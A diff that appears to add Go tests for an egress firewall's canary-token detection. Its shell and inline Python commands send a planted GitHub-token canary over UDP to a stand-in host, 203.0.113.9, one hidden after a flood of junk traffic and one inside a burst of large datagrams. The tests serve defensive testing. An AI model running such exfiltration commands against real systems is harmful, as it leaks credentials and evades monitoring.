@@ -2,10 +2,12 @@ package egress
 
 import (
 	"context"
+	"encoding/json"
 	"fmt"
 	"os"
 	"os/exec"
 	"path/filepath"
+	"slices"
 	"strconv"
 	"strings"
 	"syscall"
@@ -196,4 +198,74 @@ func sharedTempDir(t *testing.T) string {
 		}
 	}
 	return dir
+}
+
+// leftAs are the canary findings code makes of what rec observed.
+func leftAs(t *testing.T, rec *recorded) []findings.Finding {
+	t.Helper()
+	rec.mu.Lock()
+	defer rec.mu.Unlock()
+	obs := make([]findings.Observation, 0, len(rec.obs))
+	for _, o := range rec.obs {
+		raw, err := json.Marshal(o.detail)
+		if err != nil {
+			t.Fatal(err)
+		}
+		obs = append(obs, findings.Observation{Kind: o.kind, Detail: raw})
+	}
+	return findings.FromObservations(obs, testCanaries)
+}
+
+func hasRule(found []findings.Finding, rule string) bool {
+	return slices.ContainsFunc(found, func(f findings.Finding) bool { return f.Rule == rule })
+}
+
+func TestACanarySentAfterAFloodOfDirectTrafficIsStillFound(t *testing.T) {
+	requireFirewall(t)
+	rec := newRecorded()
+	e := New(Config{CA: newCA(t), Upstream: &fakeUpstream{}, Resolver: fakeResolver{}})
+	e.Observe(rec.observe)
+	e.SetCanaries(testCanaries)
+	upFirewall(t, e)
+
+	// More junk than a run records in full, then the token.
+	_, _ = asNobody(t, fmt.Sprintf(`for i in $(seq %d); do printf junk > /dev/udp/203.0.113.9/9999 2>/dev/null; done
+printf 'k=%%s' '%s' > /dev/udp/203.0.113.9/9998`, maxDirect+1, testCanaries.Get(canary.GitHubToken)))
+	rec.waitFor(t, func() bool { return hasRule(leftAs(t, rec), findings.RuleCanaryLeft) })
+	if found := leftAs(t, rec); !hasRule(found, findings.RuleDirectUnrecorded) {
+		t.Errorf("findings = %+v, want the flood itself found too", found)
+	}
+}
+
+func TestABurstOfLargePacketsLosesNoCanaryUnsaid(t *testing.T) {
+	requireFirewall(t)
+	python, err := exec.LookPath("python3")
+	if err != nil {
+		t.Skip("needs python3 to send a burst of large datagrams")
+	}
+	rec := newRecorded()
+	e := New(Config{CA: newCA(t), Upstream: &fakeUpstream{}, Resolver: fakeResolver{}})
+	e.Observe(rec.observe)
+	e.SetCanaries(testCanaries)
+	upFirewall(t, e)
+
+	// 600 datagrams of 60 KB as fast as Python sends them, the token in the
+	// 300th: either it is found, or the loss is.
+	_, _ = asNobody(t, python+` -I -c '
+import socket
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+pad = b"x" * 60000
+for i in range(600):
+    body = (b"k=`+testCanaries.Get(canary.GitHubToken)+`;" + pad) if i == 299 else pad
+    try:
+        s.sendto(body, ("203.0.113.9", 9999))
+    except OSError:
+        pass
+'`)
+	rec.waitFor(t, func() bool {
+		found := leftAs(t, rec)
+		return hasRule(found, findings.RuleCanaryLeft) || hasRule(found, findings.RuleDirectUnrecorded)
+	})
+	t.Logf("%d direct observations; canary found: %v; loss found: %v", len(rec.of(KindConnect)),
+		hasRule(leftAs(t, rec), findings.RuleCanaryLeft), hasRule(leftAs(t, rec), findings.RuleDirectUnrecorded))
 }
